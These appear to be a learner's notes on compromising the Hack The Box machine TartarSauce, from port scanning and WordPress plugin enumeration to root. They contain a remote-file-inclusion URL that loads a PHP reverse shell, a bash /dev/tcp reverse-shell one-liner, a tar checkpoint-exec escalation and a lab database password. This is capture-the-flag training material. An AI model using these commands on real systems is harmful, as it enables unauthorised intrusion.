# Enumerate

## Scan

all ports finds only port 80, service scan finds 

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
```

Can see robots.txt things:

```
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

## Inspect services

* No exploits for that version of apache
* Nikto finds:
* Dirb finds
  * [x] run on index - nothing
  * [x] run on webservices - nothing 
  * [x] tartarsource - nothing
  * [x] phpmyadmin - nothing
  * [x] dev - nothing
  * [x] monstra - found a robots and other unusables. 
  * [x] EFU - nothing 
  * [ ] 

* index page is nothing helpful
* Of the disallowed, only monstra has a page

### Monstra page

* version 3.0.4 - found exploits for it. Deleted the CSS things. Doesn't look helpful though. 

|      |                                                              |                                |
| ---- | ------------------------------------------------------------ | ------------------------------ |
|      | Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution | exploits/php/webapps/43348.txt |
|      | Monstra CMS 3.0.4 - Arbitrary Folder Deletion                | exploits/php/webapps/44512.txt |
|      | Monstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking) | exploits/php/webapps/45164.txt |

* There's a log in page. admin:admin works

# Access

## Monstra 

* use the 43348.txt directions. Doesn't work. Can't actually upload any files? 
* Tried adding a new 'editor' user but didn't show up. Tried changing admin to editor but nothing happened. 
* Some emails that aren't helpful. Can't edit the pages. Can't edit the posts. Can't seem to do anything. 
* I can edit the 404 page but doesn't look like I can visit it anywhere? Seems to be the only thing I can do or find though. 
* I guess I didn't notice the wp page. See lessons

## WP

* No exploits for the version that I got from the source

* Need to match and replace in Burp

*  use wpscan. Only finds the xmlrpc page. Tried to bruteforce. I don't think it's vulnerable to that. 

* Looks like I could username enum: http://10.10.10.88/webservices/wp/wp-login.php?action=lostpassword

* For some reason, I had to make it more aggressive to find the same things in the writeups. 

  ```
  wpscan --url http://10.10.10.88/webservices/wp/ --enumerate u,ap,t --plugins-detection aggressive
  ```

  ```
  [i] Plugin(s) Identified:
  
  [+] akismet
   | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
   | Last Updated: 2020-06-04T17:21:00.000Z
   | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
   | [!] The version is out of date, the latest version is 4.1.6
   |
   | Found By: Known Locations (Aggressive Detection)
   |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200
   |
   | Version: 4.0.3 (100% confidence)
   | Found By: Readme - Stable Tag (Aggressive Detection)
   |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
   | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
   |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
  
  [+] brute-force-login-protection
   | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
   | Latest Version: 1.5.3 (up to date)
   | Last Updated: 2017-06-29T10:39:00.000Z
   | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
   |
   | Found By: Known Locations (Aggressive Detection)
   |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403
   |
   | Version: 1.5.3 (100% confidence)
   | Found By: Readme - Stable Tag (Aggressive Detection)
   |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
   | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
   |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
  
  [+] gwolle-gb
   | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
   | Last Updated: 2020-05-15T14:11:00.000Z
   | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
   | [!] The version is out of date, the latest version is 4.0.2
   |
   | Found By: Known Locations (Aggressive Detection)
   |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
   |
   | Version: 2.3.10 (100% confidence)
   | Found By: Readme - Stable Tag (Aggressive Detection)
   |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
   | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
   |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
  ```

  * Gwolle is vulnerable to something even though the version says that it's not. W/e, i'll use it I guess. Oh, apparently the README of one of those is just a big troll. 

  ```
  WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion
  ```

  * Make a php reverse shell and navigate to:

  ```
  http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.14/php-reverse-shell.
  ```

# Escalate

## www-data -> onuma

* Onuma user that I can't access. Need to get them first. There's no processes running as Onuma. 
* Sudo -l shows:

```
www-data@TartarSauce:/var/www/html/webservices/monstra-3.0.4$ sudo -l
sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

* Could use either:

```
sudo -u tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-----
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.15.99/8082 0>&1' > a.sh
tar -cvf a.tar a.sh
sudo -u onuma tar -xvf a.tar --to-command /bin/bash
```

## onuma -> root

* no sudo -l, nothing on crontab
* Lets look around those other directories I never got into. Could look more but nothing seems helpful. And a few of the robots directories don't even exist. Another troll move. 
* Netstat shows local mysql. Access denied w/o password. It's not running as root either. 
* Run linpeas, interesting things

```
-rwxr-xr-x 1 root root 1701 Feb 21  2018 /usr/sbin/backuperer
lrwxrwxrwx 1 root  root     9 Feb 17  2018 shadow_bkp -> /dev/null
define('DB_NAME', 'wp');
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');
define('DB_HOST', 'localhost');
```

* Connecting to mysql just gives wpadmin, probably nothing helpful. 
* Try to run backuperer - gets mad that I can't write to /var/backups/onuma_backup_test.txt
* I can read the backuperer script
* It waits for 30 seconds, so just intercept and change the log so that it reports the diff of two files. One of which is root. 
* Tried to just change the files in the www directory or write. Won't let me. I can change things in tmp/cache and symlink. Maybe that'll work. Wait for it to run again and then check the dir. The file shows up but it just says broken link so I guess that doesn't work. Have to exploit it before it writes. 
* Good example of automating and w/ one liner: https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html#site
  * and I also just copied it so...

# Lessons

* my original search didn't find it because I didn't have blank extensions checked on dirbuster. It wasn't finding the directory because it returns a 404 on the index because it's broken. 
* WPScan aggressive. 

